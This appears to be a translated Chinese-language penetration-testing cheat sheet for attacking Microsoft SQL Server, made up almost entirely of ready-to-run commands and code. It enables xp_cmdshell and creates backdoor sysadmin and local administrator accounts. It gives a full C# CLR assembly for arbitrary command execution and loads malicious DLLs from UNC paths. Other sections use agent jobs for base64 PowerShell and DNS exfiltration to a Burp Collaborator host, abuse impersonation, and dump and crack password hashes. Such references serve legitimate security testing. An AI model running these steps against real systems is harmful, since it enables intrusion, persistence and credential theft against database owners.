# MSSQL服务器

## 摘要

* [工具](#工具)
* [识别实例和数据库](#识别实例和数据库)
  * [发现本地SQL Server实例](#发现本地sql-server实例)
  * [发现域SQL Server实例](#发现域sql-server实例)
    * [发现远程SQL Server实例](#发现远程sql-server实例)
  * [识别加密的数据库](#识别加密的数据库)
  * [版本查询](#版本查询)
* [识别敏感信息](#识别敏感信息)
  * [从特定数据库获取表](#从特定数据库获取表)
  * [从每列收集5个条目](#从每列收集5个条目)
  * [从特定表收集5个条目](#从特定表收集5个条目)
    * [将服务器上的常见信息转储到文件](#将服务器上的常见信息转储到文件)
* [链接数据库](#链接数据库)
  * [查找受信任的链接](#查找受信任的链接)
  * [通过链接执行查询](#通过链接执行查询)
  * [在域中爬行实例的链接](#在域中爬行实例的链接)
  * [爬行特定实例的链接](#爬行特定实例的链接)
  * [查询链接数据库的版本](#查询链接数据库的版本)
  * [在链接数据库上执行过程](#在链接数据库上执行过程)
  * [确定链接数据库的名称](#确定链接数据库的名称)
  * [从选定的链接数据库确定所有表的名称](#从选定的链接数据库确定所有表的名称)
  * [从选定的链接表中收集前5列](#从选定的链接表中收集前5列)
  * [从选定的链接列收集条目](#从选定的链接列收集条目)
* [通过xp_cmdshell执行命令](#通过xp_cmdshell执行命令)
* [扩展存储过程](#扩展存储过程)
  * [添加扩展存储过程并列出扩展存储过程](#添加扩展存储过程并列出扩展存储过程)
* [CLR程序集](#clr程序集)
  * [使用CLR程序集执行命令](#使用clr程序集执行命令)
  * [手动创建CLR DLL并导入它](#手动创建clr-dll并导入它)
* [OLE自动化](#ole自动化)
  * [使用OLE自动化程序执行命令](#使用ole自动化程序执行命令)
* [代理作业](#代理作业)
  * [通过SQL代理作业服务执行命令](#通过sql代理作业服务执行命令)
  * [列出所有作业](#列出所有作业)
* [外部脚本](#外部脚本)
  * [Python](#python)
  * [R](#r)
* [审计检查](#审计检查)
  * [寻找并利用模拟机会](#寻找并利用模拟机会)
* [找到被配置为可信任的数据库](#找到被配置为可信任的数据库)
* [手动SQL Server查询](#手动sql-server查询)
  * [查询当前用户并确定用户是否为sysadmin](#查询当前用户并确定用户是否为sysadmin)
  * [当前角色](#当前角色)
  * [当前数据库](#当前数据库)
  * [列出所有表](#列出所有表)
  * [列出所有数据库](#列出所有数据库)
  * [服务器上的所有登录名](#服务器上的所有登录名)
  * [数据库的所有数据库用户](#数据库的所有数据库用户)
  * [列出所有Sysadmins](#列出所有sysadmins)
  * [列出所有数据库角色](#列出所有数据库角色)
  * [来自服务器的有效权限](#来自服务器的有效权限)
  * [来自数据库的有效权限](#来自数据库的有效权限)
  * [找到可以为当前数据库模拟的SQL Server登录名](#找到可以为当前数据库模拟的sql-server登录名)
  * [利用模拟](#利用模拟)
  * [利用嵌套模拟](#利用嵌套模拟)
  * [MSSQL账户和哈希](#mssql账户和哈希)
* [参考资料](#参考资料)

## 工具

* [NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - 针对SQL Server的攻击性侦察和后渗透的PowerShell工具包
* [skahwah/SQLRecon](https://github.com/skahwah/SQLRecon/) - 为进攻性侦察和后渗透设计的C# MS SQL工具包。

## 识别实例和数据库

### 发现本地SQL Server实例

```ps1
Get-SQLInstanceLocal
```

### 发现域SQL Server实例

```ps1
Get-SQLInstanceDomain -Verbose
# 获取找到的实例的服务器信息
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
# 获取数据库名称
Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
```

# 发现远程SQL Server实例

```ps1
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
```

# 识别加密数据库

注意：这些数据库对管理员来说是自动解密的


```ps1
Get-SQLDatabase -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Verbose | Where-Object {$_.is_encrypted -eq "True"}
```

# 版本查询

```ps1
Get-SQLInstanceDomain | Get-Query "select @@version"
```

## 识别敏感信息

### 从特定数据库获取表

```ps1
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DBNameFromGet-SQLDatabaseCommand> -NoDefaults
获取表的列详细信息
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DBName> -TableName <TableName>
```

### 收集每列的前5个条目


```ps1
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "<columnname1,columnname2,columnname3,columnname4,columnname5>" -Verbose -SampleSize 5
```

### 收集特定表的前5个条目


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query 'select TOP 5 * from <DatabaseName>.dbo.<TableName>'
```

### 从服务器转储常见信息到文件

```ps1
Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
```

## 链接数据库

### 查找受信任的链接

```sql
select * from master..sysservers
```

### 通过链接执行查询

```sql
-- 通过链接执行查询
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- 链接多个openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- 执行shell命令
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- 创建用户并给予管理员权限
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

### 爬取域中实例的链接

有效链接将由结果中的DatabaseLinkName字段标识


```ps1
Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
select * from master..sysservers
```

### 为特定实例爬取链接

```ps1
Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
```

### 查询链接数据库的版本


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
```

### 在链接数据库上执行过程

```ps1
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

### 确定链接数据库的名称

> tempdb、model和msdb是默认数据库，通常不值得查看。Master也是默认的，但可能包含一些信息，而其他任何自定义数据库绝对值得深入挖掘。结果是DatabaseName，用于后续查询。

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
```

### 从选定的链接数据库中确定所有表的名称

> 结果是TableName，用于后续查询。


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
```

### 收集选定链接表的前5列

> 结果是ColumnName和ColumnValue，用于后续查询。


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')" -Verbose
```

### 收集选定链接列的条目


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
```


## 通过xp_cmdshell执行命令

> 自SQL Server 2005起，xp_cmdshell默认被禁用

```ps1
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami

# 创建并添加本地用户backup到本地管理员组：
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```

* 手动执行SQL查询

  ```sql
  EXEC xp_cmdshell "net user";
  EXEC master..xp_cmdshell 'whoami'
  EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
  EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
  ```

* 如果需要重新激活xp_cmdshell（自SQL Server 2005起默认被禁用）

  ```sql
  EXEC sp_configure 'show advanced options',1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1;
  RECONFIGURE;
  ```

* 如果该过程被卸载

  ```sql
  sp_addextendedproc 'xp_cmdshell','xplog70.dll'
  ```


## 扩展存储过程

### 添加扩展存储过程并列出扩展存储过程

```ps1
# 创建恶意DLL
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

# 加载DLL并调用xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"

# 列出现有的
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

* 使用[xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)构建DLL

* 加载DLL

  ```sql
  -- 也可以从UNC路径或Webdav加载
  sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
  EXEC xp_calc
  sp_dropextendedproc 'xp_calc'
  ```

## CLR程序集

先决条件：

* sysadmin权限
* CREATE ASSEMBLY权限（或）
* ALTER ASSEMBLY权限（或）

执行以**服务帐户**的权限进行。

### 使用CLR程序集执行命令

```ps1
# 为DLL创建C#代码，DLL和SQL查询以DLL的十六进制字符串形式
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop

# 使用CLR程序集执行命令
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose

# 列出使用CLR添加的所有存储过程
Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
```

### 手动创建CLR DLL并导入它

使用以下内容创建C# DLL文件，命令为：`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs`

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // 创建记录并指定列的元数据。
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        
        // 标记结果集的开始。
        SqlContext.Pipe.SendResultsStart(record);

        // 为行中的每一列设置值
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // 将行发送回客户端。
        SqlContext.Pipe.SendResultsRow(record);
        
        // 标记结果集的结束。
        SqlContext.Pipe.SendResultsEnd();
        
        proc.WaitForExit();
        proc.Close();
    }
};
```

然后按照以下指示操作：

1. 在服务器上启用`show advanced options`

   ```sql
   sp_configure 'show advanced options',1; 
   RECONFIGURE
   GO
   ```

2. 在服务器上启用CLR

   ```sql
   sp_configure 'clr enabled',1
   RECONFIGURE
   GO
   ```

3. 导入程序集

   ```sql
   CREATE ASSEMBLY my_assembly
   FROM 'c:\temp\cmd_exec.dll'
   WITH PERMISSION_SET = UNSAFE;
   ```

4. 将程序集链接到存储过程

   ```sql
   CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
   GO
   ```

5. 执行并清理

   ```sql
   cmd_exec "whoami"
   DROP PROCEDURE cmd_exec
   DROP ASSEMBLY my_assembly
   ```

**CREATE ASSEMBLY**还将接受CLR DLL的十六进制字符串表示形式

```sql
CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
0x4D5A90000300000004000000F[TRUNCATED]
WITH PERMISSION_SET = UNSAFE 
GO 
```

## OLE自动化

* 默认禁用
* 执行操作时使用**服务账户**的权限。

### 使用OLE自动化程序执行命令

```ps1
Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
```

```ps1
# 启用OLE自动化
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure

# 执行命令
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
```

```powershell
# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```

## 代理作业

* 如果未配置代理账户，执行操作时使用**SQL Server代理服务账户**的权限。
* :warning: 需要**sysadmin**或**SQLAgentUserRole**、**SQLAgentReaderRole**和**SQLAgentOperatorRole**角色来创建作业。

### 通过SQL代理作业服务执行命令

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem选项：
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- 删除
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

### 列出所有作业

```ps1
SELECT job_id, [name] FROM msdb.dbo.sysjobs;
SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
```

## 外部脚本

:warning: 您需要启用**外部脚本**。

```sql
sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```

## Python：

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```

## R

```ps1
Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO

@script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
```

## 审计检查

### 查找并利用身份冒充机会

* 冒充为：`EXECUTE AS LOGIN = 'sa'`

* 使用DB_OWNER冒充`dbo`

  ```sql
  SQL> select is_member('db_owner');
  SQL> execute as user = 'dbo'
  SQL> SELECT is_srvrolemember('sysadmin')
  ```

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# 冒充sa账户
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```

## 查找被配置为可信任的数据库

```sql
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 

SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
```

> 以下审计检查通过反射运行Web请求以加载Inveigh。请注意环境和连接出站的能力。

```ps1
Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
```

## 手动SQL Server查询

### 查询当前用户并确定用户是否为sysadmin

```sql
select suser_sname()
Select system_user
select is_srvrolemember('sysadmin')
```

### 当前角色

```sql
Select user
```

### 当前数据库

```sql
select db_name()
```

### 列出所有表

```sql
select table_name from information_schema.tables
```

### 列出所有数据库

```sql
select name from master..sysdatabases
```

### 服务器上的所有登录名

```sql
Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
```

### 数据库的所有数据库用户

```sql
Select * from sys.database_principals where type_desc != 'database_role';
```

### 列出所有Sysadmins

```sql
SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
```

### 列出所有数据库角色

```sql
SELECT DB1.name AS DatabaseRoleName,
isnull (DB2.name, 'No members') AS DatabaseUserName
FROM sys.database_role_members AS DRM
RIGHT OUTER JOIN sys.database_principals AS DB1
ON DRM.role_principal_id = DB1.principal_id
LEFT OUTER JOIN sys.database_principals AS DB2
ON DRM.member_principal_id = DB2.principal_id
WHERE DB1.type = 'R'
ORDER BY DB1.name;
```

### 服务器的有效权限

```sql
select * from fn_my_permissions(null, 'server');
```

### 数据库的有效权限

```sql
SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');
```

### 查找当前数据库可以被冒充的SQL Server登录名

```sql
select distinct b.name
from sys.server_permissions a
inner join sys.server_principals b
on a.grantor_principal_id = b.principal_id
where a.permission_name = 'impersonate'
```

### 利用身份冒充

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

### 利用嵌套身份冒充

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

### MSSQL账户和哈希值

```sql
MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (需要转换为十六进制以在MSSQL错误消息/某些版本的查询分析器中返回哈希值。)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

然后使用Hashcat破解密码：`hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force`

```ps1
131	MSSQL (2000)	0x0100270256050000000000000000
```

```ps1
131	MSSQL (2000)	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
132	MSSQL (2005)	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
1731	MSSQL (2012, 2014)	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
```


## 参考

* [PowerUpSQL 备忘单和 SQL Server 查询 - Leo Pitt](https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3)
* [PowerUpSQL 备忘单 - Scott Sutherland](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
* [攻击 SQL Server CLR 程序集 - Scott Sutherland - 2017年7月13日](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
* [用于命令执行的 MSSQL 代理作业 - Nicholas Popovich - 2016年9月21日](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)